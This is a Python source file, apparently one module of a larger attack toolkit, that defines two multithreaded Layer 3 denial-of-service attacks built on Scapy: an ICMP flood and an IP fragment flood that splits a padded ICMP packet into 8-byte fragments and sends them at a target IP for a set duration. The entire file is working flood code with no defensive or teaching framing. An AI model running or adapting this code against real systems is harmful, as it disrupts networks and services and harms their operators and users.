import threading
import time
from scapy.all import IP, ICMP, send, fragment
from config import CONFIG, logger
from attacks.layer4 import Layer4Attack

class Layer3Attack(Layer4Attack):
    def __init__(self, target_ip, duration, attack_type):
        # Port is not typically used in L3 attacks, so we can pass a dummy value like 0
        super().__init__(target_ip, port=0, duration=duration, attack_type=attack_type)

class ICMPFloodAttack(Layer3Attack):
    def run(self):
        def attack():
            pkt = IP(dst=self.target_ip)/ICMP()
            start_time = time.time()
            packet_count = 0
            while time.time() - start_time < self.duration and not self.stop_event.is_set():
                try:
                    send(pkt, verbose=0)
                    packet_count += 1
                    if packet_count % 1000 == 0:
                        logger.info(f"Sent {packet_count} ICMP packets")
                    time.sleep(0.001)
                except Exception as e:
                    logger.error(f"Error in ICMP Flood: {e}")
            logger.info(f"ICMP Flood attack finished. Total packets sent: {packet_count}")

        logger.info(f"Starting ICMP Flood attack on {self.target_ip} with {CONFIG['threads']} threads")
        threads = [threading.Thread(target=attack) for _ in range(CONFIG['threads'])]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

class IPFragmentFloodAttack(Layer3Attack):
    def run(self):
        def attack():
            # Create a large packet to be fragmented
            payload = "A" * 1500
            pkt = IP(dst=self.target_ip)/ICMP()/payload

            start_time = time.time()
            packet_count = 0
            while time.time() - start_time < self.duration and not self.stop_event.is_set():
                try:
                    # Scapy's fragment() function will automatically break the packet into fragments
                    frags = fragment(pkt, fragsize=8)
                    for frag in frags:
                        send(frag, verbose=0)
                    packet_count += len(frags)
                    if packet_count % 1000 == 0:
                        logger.info(f"Sent {packet_count} IP fragments")
                    time.sleep(0.001)
                except Exception as e:
                    logger.error(f"Error in IP Fragment Flood: {e}")
            logger.info(f"IP Fragment Flood attack finished. Total fragments sent: {packet_count}")

        logger.info(f"Starting IP Fragment Flood attack on {self.target_ip} with {CONFIG['threads']} threads")
        threads = [threading.Thread(target=attack) for _ in range(CONFIG['threads'])]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
